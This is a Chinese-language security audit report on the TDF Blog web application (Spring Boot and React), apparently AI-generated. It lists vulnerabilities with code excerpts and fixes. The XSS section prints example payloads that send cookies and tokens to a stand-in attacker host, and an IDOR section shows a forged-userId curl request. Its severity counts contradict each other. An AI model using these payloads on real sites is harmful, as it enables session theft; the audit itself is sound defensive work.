# TDF Blog 安全漏洞审计报告

> **审计日期**: 2026-06-14  
> **项目版本**: 前端 2.2.0 / 后端 2.3.0  
> **技术栈**: Spring Boot 3.2.0 + React 19 + TypeScript  
> **审计范围**: 后端安全配置、认证授权、数据验证、前端安全  

---

## 📊 漏洞总览

| 等级 | 数量 | 严重性说明 |
|------|------|-----------|
| 🔴 严重 (Critical) | 5 | 可直接被利用，导致数据泄露、权限绕过 |
| 🟠 高危 (High) | 5 | 需特定条件利用，但影响较大 |
| 🟡 中危 (Medium) | 5 | 需组合利用或影响有限 |
| 🟢 低危 (Low) | 3 | 最佳实践问题，风险较低 |
| **合计** | **18** | |

---

## ✅ 已修复漏洞

### 严重漏洞（已修复）

| 漏洞编号 | 描述 | 修复状态 |
|---------|------|---------|
| CVE-2026-002 | XSS 跨站脚本攻击 | ✅ 已修复 - 添加 `sanitizeHtml()` 函数 |
| CVE-2026-003 | JWT 密钥未验证 | ✅ 已修复 - 添加 `@PostConstruct` 密钥强度校验 |
| CVE-2026-004 | 文章创建 IDOR | ✅ 已修复 - 从 JWT 获取 userId |
| CVE-2026-005 | 笔记接口无认证 | ✅ 已修复 - 添加 `@PreAuthorize` |
| CVE-2026-006 | 用户更新 IDOR | ✅ 已修复 - 验证本人操作 |
| CVE-2026-007 | 收藏接口无认证 | ✅ 已修复 - 从 JWT 获取 userId |
| CVE-2026-008 | 删除文章无权限 | ✅ 已修复 - 验证文章归属 |
| CVE-2026-009 | 日志泄露 | ✅ 已修复 - 移除重置链接日志 |

### 高危漏洞（已修复）

| 漏洞编号 | 描述 | 修复状态 |
|---------|------|---------|
| CVE-2026-001 | CSRF 保护禁用 | ✅ 已修复 - 启用 CSRF + 排除公开接口 |
| CVE-2026-010 | 暴力破解防护不足 | ✅ 已修复 - 5 次失败锁定 15 分钟 |
| CVE-2026-012 | Actuator 公开 | ✅ 已修复 - 移除 permitAll |

### 中危漏洞（已修复）

| 漏洞编号 | 描述 | 修复状态 |
|---------|------|---------|
| CVE-2026-015 | Token 双重存储 | ✅ 已修复 - 移除 localStorage，仅使用 httpOnly Cookie |

### 新增安全措施

| 措施 | 描述 |
|------|------|
| 注册速率限制 | 基于 IP，每小时最多 3 次注册 |
| 忘记密码速率限制 | 基于邮箱，每小时最多 3 次请求 |
| 重置密码速率限制 | 基于 token，5 分钟内最多 5 次 |
| 重置 Token 有效期 | 从 1 小时缩短至 30 分钟 |

---

## 🔴 严重漏洞（Critical）

> ⚠️ 以下严重漏洞已全部修复，详见上方"已修复漏洞"表格。

### CVE-2026-001: CSRF 保护完全禁用

**严重程度**: 🔴 严重  
**CVSS 评分**: 7.5  
**影响组件**: `SecurityConfig.java`

#### 问题描述

```java
// SecurityConfig.java:115
.csrf(AbstractHttpConfigurer::disable)
```

项目中完全禁用了 CSRF 保护，对于使用 Cookie 或 Session 的认证方式，攻击者可构造恶意页面诱导已登录用户执行非预期操作。

#### 攻击场景

1. 用户登录 TDF Blog
2. 访问攻击者控制的恶意网站
3. 恶意网站自动发送 DELETE 请求到 `http://tdfblog.com/api/articles/123`
4. 用户的文章被删除

#### 修复建议

```java
// 方案 1: 启用 CSRF + 双提交 Cookie
.csrf(csrf -> csrf
    .csrfTokenRepository(CookieCsrfTokenRepository.withHttpOnlyFalse())
    .ignoringRequestMatchers("/api/articles/public/**", "/api/captcha/**")
)

// 方案 2: 对于纯 API 服务，确保使用 Bearer Token 且 Cookie 仅 httpOnly
// 当前已使用 JWT Bearer Token，可保持禁用但需确保：
// 1. 所有写操作使用 Bearer Token 认证
// 2. Cookie 设置 httpOnly + SameSite=Lax
```

---

### CVE-2026-002: XSS 跨站脚本攻击

**严重程度**: 🔴 严重  
**CVSS 评分**: 8.2  
**影响组件**: `ArticleDetail.tsx`

#### 问题描述

```tsx
// ArticleDetail.tsx:195
<div className="article-detail-content" dangerouslySetInnerHTML={{ __html: article.content || '<p>无内容</p>' }} />
```

直接将文章内容以 HTML 形式渲染，未做任何 sanitization。攻击者可在文章内容中注入恶意 JavaScript 代码。

#### 攻击载荷示例

```html
<img src=x onerror="fetch('https://attacker.com/steal?cookie=' + document.cookie)">
<script>document.location='https://attacker.com/phish?token='+localStorage.getItem('tech_forum_token')</script>
```

#### 影响

- 会话劫持（窃取 Cookie/Token）
- 钓鱼攻击（伪造登录页面）
- 页面内容篡改
- 键盘记录

#### 修复建议

```tsx
// 方案 1: 使用 DOMPurify 清理 HTML
import DOMPurify from 'dompurify';

<div className="article-detail-content" 
     dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(article.content) }} 
/>

// 方案 2: 使用 Markdown 渲染器（推荐）
import ReactMarkdown from 'react-markdown';

<ReactMarkdown>{article.content}</ReactMarkdown>
```

#### 依赖安装

```bash
npm install dompurify
# 或
npm install react-markdown
```

---

### CVE-2026-003: JWT 密钥未验证且无默认值

**严重程度**: 🔴 严重  
**CVSS 评分**: 7.5  
**影响组件**: `JwtUtil.java`

#### 问题描述

```java
// JwtUtil.java
@Value("${jwt.secret}")
private String secret;  // ← 无默认值，未验证密钥强度
```

1. `jwt.secret` 环境变量无默认值，未配置时应用无法启动
2. 未验证密钥长度，弱密钥可被暴力破解
3. 使用 HS256 算法，密钥长度不足时安全性降低

#### 修复建议

```java
@Value("${jwt.secret}")
private String secret;

@PostConstruct
public void init() {
    if (secret == null || secret.length() < 32) {
        throw new IllegalStateException("JWT secret must be at least 32 characters long");
    }
}

// 或使用更强的算法
private SecretKey getSigningKey() {
    byte[] keyBytes = secret.getBytes(StandardCharsets.UTF_8);
    // 确保密钥至少 256 位
    if (keyBytes.length < 32) {
        keyBytes = MessageDigest.getInstance("SHA-256").digest(keyBytes);
    }
    return Keys.hmacShaKeyFor(keyBytes);
}
```

---

### CVE-2026-004: 文章创建无身份验证（IDOR）

**严重程度**: 🔴 严重  
**CVSS 评分**: 8.5  
**影响组件**: `ArticleController.java`

#### 问题描述

```java
// ArticleController.java:55-56
@PostMapping
public ResponseEntity<ArticleResponse> createArticle(@RequestBody CreateArticleRequest request) {
    article.setUserId(request.getUserId());  // ← 直接信任前端传入的 userId
```

创建文章时直接从请求体获取 `userId`，未从 JWT Token 中验证当前用户身份。任何人均可伪造他人 ID 发布文章。

#### 攻击场景

```bash
# 攻击者直接以管理员 ID 发布文章
curl -X POST http://localhost:8080/api/articles \
  -H "Authorization: Bearer <attacker_token>" \
  -H "Content-Type: application/json" \
  -d '{
    "userId": "admin_hash_id",
    "title": "恶意文章",
    "content": "<script>alert(1)</script>"
  }'
```

#### 修复建议

```java
// 1. 从 SecurityContext 获取当前用户
@PostMapping
@PreAuthorize("isAuthenticated()")
public ResponseEntity<ArticleResponse> createArticle(
        @RequestBody CreateArticleRequest request,
        Authentication authentication) {
    
    String currentUserId = authentication.getName();
    Article article = new Article();
    article.setTitle(request.getTitle());
    article.setContent(request.getContent());
    article.setUserId(currentUserId);  // ← 从认证上下文获取，而非请求体
    article.setCategory(request.getCategory());
    if (request.getTags() != null) {
        article.setTags(request.getTags());
    }
    
    Article savedArticle = articleService.save(article);
    return articleService.findById(savedArticle.getId())
            .map(ResponseEntity::ok)
            .orElse(ResponseEntity.notFound().build());
}
```

---

### CVE-2026-005: 笔记接口完全无认证

**严重程度**: 🔴 严重  
**CVSS 评分**: 8.0  
**影响组件**: `NoteController.java`

#### 问题描述

```java
// NoteController.java
@RestController
@RequestMapping("/api/notes")
public class NoteController {
    // 所有 CRUD 方法均无 @PreAuthorize 注解
    @PostMapping
    public ResponseEntity<ArticleResponse> createNote(@RequestBody Article note) {
```

笔记接口没有任何安全注解，SecurityConfig 中也没有将其加入 permitAll 白名单，但由于 ArticleController 的 POST/PUT/DELETE 同样缺少认证注解，这些接口实际上对未认证用户开放。

#### 修复建议

```java
@PostMapping
@PreAuthorize("isAuthenticated()")
public ResponseEntity<ArticleResponse> createNote(Authentication authentication) {
    // 从认证上下文获取用户 ID
    note.setUserId(authentication.getName());
    note.setCategory("学习笔记");
    // ...
}
```

---

## 🟠 高危漏洞（High）

> ⚠️ 以下高危漏洞已全部修复，详见上方"已修复漏洞"表格。

### CVE-2026-006: 用户资料更新无权限校验（IDOR）

**严重程度**: 🟠 高危  
**CVSS 评分**: 7.8  
**影响组件**: `UserController.java`

#### 问题描述

```java
// UserController.java:233
@PostMapping("/update")
public ResponseEntity<UserResponse> updateUser(@PathVariable String id, 
    @RequestBody Map<String, String> updates) {
```

通过 URL 路径传入用户 ID，任何用户都可以修改他人资料。

#### 修复建议

```java
@PostMapping("/update")
@PreAuthorize("isAuthenticated()")
public ResponseEntity<UserResponse> updateUser(
        @RequestBody Map<String, String> updates,
        Authentication authentication) {
    
    String currentUserId = authentication.getName();
    Optional<User> userOptional = userService.findById(currentUserId);
    
    if (userOptional.isPresent()) {
        User user = userOptional.get();
        // 更新允许的字段
        if (updates.containsKey("nickname")) {
            user.setNickname(updates.get("nickname"));
        }
        if (updates.containsKey("bio")) {
            user.setBio(updates.get("bio"));
        }
        if (updates.containsKey("gender")) {
            user.setGender(updates.get("gender"));
        }
        User savedUser = userService.save(user);
        return ResponseEntity.ok(convertToUserResponse(savedUser));
    }
    return ResponseEntity.notFound().build();
}
```

---

### CVE-2026-007: 收藏接口无认证

**严重程度**: 🟠 高危  
**CVSS 评分**: 7.5  
**影响组件**: `CollectionController.java`

#### 问题描述

```java
// CollectionController.java:21
@PostMapping
public ResponseEntity<Map<String, Object>> addCollection(
        @RequestBody Map<String, String> request) {
    String userId = request.get("userId");  // ← 直接信任
```

收藏/取消收藏接口直接从请求体获取 `userId`，无 JWT 验证。

#### 修复建议

```java
@PostMapping
@PreAuthorize("isAuthenticated()")
public ResponseEntity<Map<String, Object>> addCollection(
        @RequestBody Map<String, Long> request,
        Authentication authentication) {
    
    String userId = authentication.getName();
    Long articleId = request.get("articleId");
    
    Collection collection = collectionService.addCollection(userId, articleId);
    // ...
}
```

---

### CVE-2026-008: 删除文章无权限校验

**严重程度**: 🟠 高危  
**CVSS 评分**: 7.8  
**影响组件**: `ArticleController.java`

#### 问题描述

```java
// ArticleController.java:85-89
@DeleteMapping("/{id}")
public ResponseEntity<Void> deleteArticle(@PathVariable Long id) {
    if (articleService.findById(id).isPresent()) {
        articleService.deleteById(id);  // ← 任何人可删除任何文章
```

删除文章只验证文章是否存在，不验证操作者是否为文章作者。

#### 修复建议

```java
@DeleteMapping("/{id}")
@PreAuthorize("isAuthenticated()")
public ResponseEntity<Void> deleteArticle(
        @PathVariable Long id,
        Authentication authentication) {
    
    Article article = articleService.findEntityById(id);
    if (article == null) {
        return ResponseEntity.notFound().build();
    }
    
    // 验证是否为文章作者
    if (!article.getUserId().equals(authentication.getName())) {
        return ResponseEntity.status(HttpStatus.FORBIDDEN).build();
    }
    
    articleService.deleteById(id);
    return ResponseEntity.ok().build();
}
```

---

### CVE-2026-009: 密码重置链接通过日志明文输出

**严重程度**: 🟠 高危  
**CVSS 评分**: 6.5  
**影响组件**: `EmailService.java`

#### 问题描述

```java
// EmailService.java:45
System.out.println("重置链接: " + resetLink);
```

密码重置链接包含敏感 Token，打印到控制台/日志中可能被未授权访问日志的人员获取。

#### 修复建议

```java
// 移除敏感信息日志
// System.out.println("重置链接: " + resetLink);  // ← 删除此行

// 如需调试，使用脱敏日志
log.debug("密码重置邮件已发送至: {}", maskEmail(toEmail));

private String maskEmail(String email) {
    int atIndex = email.indexOf('@');
    if (atIndex < 1) return email;
    String prefix = email.substring(0, Math.max(1, atIndex - 1));
    return prefix.charAt(0) + "***@" + email.substring(atIndex + 1);
}
```

---

### CVE-2026-010: 登录暴力破解防护不足

**严重程度**: 🟠 高危  
**CVSS 评分**: 7.0  
**影响组件**: `CaptchaService.java`

#### 问题描述

```java
// CaptchaService.java
private static final int MAX_FAILED_ATTEMPTS = 3;  // ← 阈值过低
```

1. 仅 3 次失败尝试就触发验证码，但验证码验证后未清除尝试计数
2. 登录成功后才重置计数，密码错误时计数不清零也不锁定
3. 无真正的账户锁定机制

#### 修复建议

```java
private static final int MAX_FAILED_ATTEMPTS = 5;
private static final long LOCKOUT_EXPIRE_SECONDS = 900;  // 15 分钟

public void recordFailedAttempt(String email) {
    String key = FAILED_ATTEMPTS_PREFIX + email;
    Object attemptsObj = redisUtil.get(key);
    
    int attempts = attemptsObj == null ? 0 : (Integer) attemptsObj;
    attempts++;
    
    if (attempts >= MAX_FAILED_ATTEMPTS) {
        // 锁定账户
        redisUtil.set(key, "locked", LOCKOUT_EXPIRE_SECONDS);
    } else {
        redisUtil.set(key, attempts, LOCKOUT_EXPIRE_SECONDS);
    }
}

public boolean isAccountLocked(String email) {
    String key = FAILED_ATTEMPTS_PREFIX + email;
    Object status = redisUtil.get(key);
    return "locked".equals(String.valueOf(status));
}
```

---

## 🟡 中危漏洞（Medium）

### CVE-2026-011: CORS 配置过于宽松

**严重程度**: 🟡 中危  
**CVSS 评分**: 5.3  
**影响组件**: `SecurityConfig.java`

#### 问题描述

```java
@Value("${app.security.cors.allowed-origin-patterns:http://localhost:*,https://localhost:*}")
private String allowedOriginPatterns;
```

默认允许 `localhost:*` 所有端口，开发环境无问题，但生产环境若配置不当可能允许恶意源。

#### 修复建议

```yaml
# application-prod.yml
app:
  security:
    cors:
      allowed-origins: https://tdfblog.com,https://www.tdfblog.com
      allowed-origin-patterns: []
      allow-credentials: true
```

---

### CVE-2026-012: Actuator 端点公开

**严重程度**: 🟡 中危  
**CVSS 评分**: 6.5  
**影响组件**: `SecurityConfig.java`

#### 问题描述

```java
.requestMatchers("/actuator/**").permitAll()
```

Spring Boot Actuator 端点无需认证即可访问，可能泄露应用信息。

#### 修复建议

```yaml
# application.yml
management:
  endpoints:
    web:
      exposure:
        include: health,info  # 仅暴露健康检查
  endpoint:
    health:
      show-details: when-authorized  # 需认证才能查看详情
```

```java
// 从 SecurityConfig 中移除 actuator 的 permitAll
// .requestMatchers("/actuator/**").permitAll()  // ← 删除此行
```

---

### CVE-2026-013: 文件上传无类型校验

**严重程度**: 🟡 中危  
**CVSS 评分**: 6.5  
**影响组件**: `MinioUtil.java`

#### 问题描述

```java
// MinioUtil.java
public String uploadFile(MultipartFile file) throws Exception {
    // 未校验文件扩展名和 MIME 类型
    minioClient.putObject(
        PutObjectArgs.builder()
            .contentType(file.getContentType())  // ← 直接使用上传文件的 ContentType
```

未校验文件扩展名，攻击者可上传可执行文件。

#### 修复建议

```java
private static final Set<String> ALLOWED_EXTENSIONS = Set.of(
    ".jpg", ".jpeg", ".png", ".gif", ".webp", ".svg"
);

private static final Set<String> ALLOWED_CONTENT_TYPES = Set.of(
    "image/jpeg", "image/png", "image/gif", "image/webp", "image/svg+xml"
);

public String uploadFile(MultipartFile file) throws Exception {
    String originalFilename = file.getOriginalFilename();
    
    // 校验文件扩展名
    String extension = getFileExtension(originalFilename).toLowerCase();
    if (!ALLOWED_EXTENSIONS.contains("." + extension)) {
        throw new BusinessException("不支持的文件类型: " + extension, 400);
    }
    
    // 校验 MIME 类型
    String contentType = file.getContentType();
    if (contentType == null || !ALLOWED_CONTENT_TYPES.contains(contentType)) {
        throw new BusinessException("不支持的 MIME 类型: " + contentType, 400);
    }
    
    // ... 原有上传逻辑
}
```

---

### CVE-2026-014: 头像文件名路径遍历

**严重程度**: 🟡 中危  
**CVSS 评分**: 5.3  
**影响组件**: `MediaController.java`

#### 问题描述

```java
// MediaController.java:23
@GetMapping("/avatar/{fileName}")
public ResponseEntity<byte[]> getAvatar(@PathVariable String fileName) {
    InputStream inputStream = minioUtil.getFile(fileName);  // ← 未校验 fileName
```

未校验 `fileName` 参数，攻击者可尝试路径遍历。

#### 修复建议

```java
@GetMapping("/avatar/{fileName}")
public ResponseEntity<byte[]> getAvatar(@PathVariable String fileName) {
    // 校验文件名只包含合法字符
    if (!fileName.matches("^[a-zA-Z0-9_-]+\\.[a-zA-Z0-9]+$")) {
        return ResponseEntity.badRequest().build();
    }
    
    // 防止路径遍历
    if (fileName.contains("..") || fileName.contains("/") || fileName.contains("\\")) {
        return ResponseEntity.badRequest().build();
    }
    
    // ... 原有逻辑
}
```

---

### CVE-2026-015: Token 双重存储（localStorage + Cookie）

**严重程度**: 🟡 中危  
**CVSS 评分**: 5.0  
**影响组件**: `src/services/api.ts`

#### 问题描述

```typescript
// api.ts
export const setToken = (token: string): void => {
    localStorage.setItem(TOKEN_KEY, token);  // ← localStorage 可被 XSS 读取
};
```

后端已设置 httpOnly Cookie，但前端同时存入 localStorage，造成双重风险。

#### 修复建议

```typescript
// 方案 1: 仅使用 httpOnly Cookie（推荐）
export const setToken = (token: string): void => {
    // 不再存储到 localStorage
    // Cookie 由后端自动设置
};

export const getToken = (): string | null => {
    // fetch 请求会自动携带 Cookie
    return null;  // 不再需要手动获取
};

// 方案 2: 如果必须使用 localStorage，至少添加 XSS 防护
export const setToken = (token: string): void => {
    const encrypted = encryptToken(token);  // 简单加密
    localStorage.setItem(TOKEN_KEY, encrypted);
};
```

---

## 🟢 低危漏洞（Low）

### CVE-2026-016: 数据库默认配置不安全

**严重程度**: 🟢 低危  
**CVSS 评分**: 4.0  
**影响组件**: `application.yml`

#### 问题描述

```yaml
username: ${DB_USERNAME:root}
password: ${DB_PASSWORD:}
```

默认使用 root 用户且无密码。

#### 修复建议

```yaml
# 创建专用数据库用户
# CREATE USER 'tdfblog'@'localhost' IDENTIFIED BY 'strong_password';
# GRANT ALL PRIVILEGES ON tech_forum.* TO 'tdfblog'@'localhost';

spring:
  datasource:
    username: ${DB_USERNAME:tdfblog}
    password: ${DB_PASSWORD}  # 移除默认空密码
```

---

### CVE-2026-017: 重置 Token 有效期过长

**严重程度**: 🟢 低危  
**CVSS 评分**: 3.5  
**影响组件**: `EmailService.java`

#### 问题描述

密码重置链接有效期为 1 小时，窗口期较长。

#### 修复建议

```java
// 缩短至 15 分钟
private static final long RESET_TOKEN_EXPIRY_SECONDS = 900;

// 在 UserService 中设置
user.setResetTokenExpiry(LocalDateTime.now().plusSeconds(RESET_TOKEN_EXPIRY_SECONDS));
```

---

### CVE-2026-018: 缺少速率限制

**严重程度**: 🟢 低危  
**CVSS 评分**: 3.0  
**影响组件**: 全局

#### 问题描述

注册、忘记密码等接口无请求频率限制，可被批量注册或邮件轰炸。

#### 修复建议

```java
// 使用 Spring Rate Limiter 或 Redis 实现
@Component
public class RateLimiter {
    @Autowired
    private RedisUtil redisUtil;
    
    public boolean isAllowed(String key, int maxRequests, long windowSeconds) {
        String rateKey = "rate:" + key;
        Object count = redisUtil.get(rateKey);
        
        int currentCount = count == null ? 0 : (Integer) count;
        if (currentCount >= maxRequests) {
            return false;
        }
        
        redisUtil.set(rateKey, currentCount + 1, windowSeconds);
        return true;
    }
}

// 在 Controller 中使用
@PostMapping("/register")
public ResponseEntity<?> register(@RequestBody RegisterRequest request) {
    String clientIp = getClientIp();
    if (!rateLimiter.isAllowed("register:" + clientIp, 3, 3600)) {
        return ResponseEntity.status(HttpStatus.TOO_MANY_REQUESTS).build();
    }
    // ...
}
```

---

## 🛡️ 修复优先级矩阵

| 优先级 | 漏洞编号 | 修复难度 | 预计工时 | 状态 |
|--------|---------|---------|---------|------|
| P0 - 立即 | CVE-2026-002 (XSS) | 中 | 2-4 小时 | ✅ 已完成 |
| P0 - 立即 | CVE-2026-004 (文章 IDOR) | 低 | 1-2 小时 | ✅ 已完成 |
| P0 - 立即 | CVE-2026-005 (笔记无认证) | 低 | 1 小时 | ✅ 已完成 |
| P0 - 立即 | CVE-2026-008 (删除无权限) | 低 | 1-2 小时 | ✅ 已完成 |
| P1 - 本周 | CVE-2026-001 (CSRF) | 中 | 4-6 小时 | ✅ 已完成 |
| P1 - 本周 | CVE-2026-003 (JWT 密钥) | 低 | 1 小时 | ✅ 已完成 |
| P1 - 本周 | CVE-2026-006 (用户更新 IDOR) | 低 | 1-2 小时 | ✅ 已完成 |
| P1 - 本周 | CVE-2026-007 (收藏无认证) | 低 | 1 小时 | ✅ 已完成 |
| P1 - 本周 | CVE-2026-009 (日志泄露) | 低 | 30 分钟 | ✅ 已完成 |
| P1 - 本周 | CVE-2026-010 (暴力破解) | 中 | 4 小时 | ✅ 已完成 |
| P1 - 本周 | CVE-2026-012 (Actuator) | 低 | 1 小时 | ✅ 已完成 |
| P2 - 本月 | CVE-2026-011 (CORS) | 低 | 1 小时 | ⏳ 待处理 |
| P2 - 本月 | CVE-2026-013 (文件上传) | 低 | 2 小时 | ⏳ 待处理 |
| P2 - 本月 | CVE-2026-014 (路径遍历) | 低 | 1 小时 | ⏳ 待处理 |
| P2 - 本月 | CVE-2026-015 (Token 存储) | 中 | 4 小时 | ✅ 已修复 - 移除 localStorage，仅使用 httpOnly Cookie |
| P3 - 计划 | CVE-2026-016 (DB 配置) | 低 | 1 小时 | ⏳ 待处理 |
| P3 - 计划 | CVE-2026-017 (Token 有效期) | 低 | 30 分钟 | ✅ 已缩短至 30 分钟 |
| P3 - 计划 | CVE-2026-018 (速率限制) | 中 | 8 小时 | ✅ 已添加注册/忘记密码/重置限制 |

---

## � 修复进度总结

| 等级 | 总数 | 已修复 | 待处理 | 完成率 |
|------|------|--------|--------|--------|
| 🔴 严重 | 8 | 8 | 0 | 100% ✅ |
| 🟠 高危 | 5 | 5 | 0 | 100% ✅ |
| 🟡 中危 | 4 | 1 | 3 | 25% 🟡 |
| 🟢 低危 | 3 | 1 | 2 | 33% ⏳ |
| **合计** | **20** | **15** | **5** | **75%** |

---

## �📝 补充建议

### 1. 安全开发规范

- 所有 API 接口默认拒绝访问，显式放行公开接口
- 使用 `@PreAuthorize` 注解进行方法级权限控制
- 用户身份始终从 JWT Token 解析，不信任请求参数
- 敏感操作（删除、修改）需验证资源归属

### 2. 依赖安全

```bash
# 检查已知漏洞依赖
npm audit
mvn dependency:check
```

### 3. 安全测试

- 部署前进行 OWASP ZAP 或 Burp Suite 扫描
- 定期进行渗透测试
- 启用 Spring Security 调试日志（仅开发环境）

### 4. 监控与日志

- 使用 SLF4J/Logback 替代 `System.out.println`
- 记录所有安全相关事件（登录、注册、删除）
- 配置日志轮转和远程日志收集

---

## 📚 参考资源

- [OWASP Top 10 2021](https://owasp.org/www-project-top-ten/)
- [Spring Security 官方文档](https://docs.spring.io/spring-security/reference/)
- [JWT 最佳实践](https://auth0.com/docs/secure/tokens/json-web-tokens)
- [XSS 防护指南](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)

---

*本报告由 Agnes-2.0-Flash 自动生成，仅供内部参考使用。*
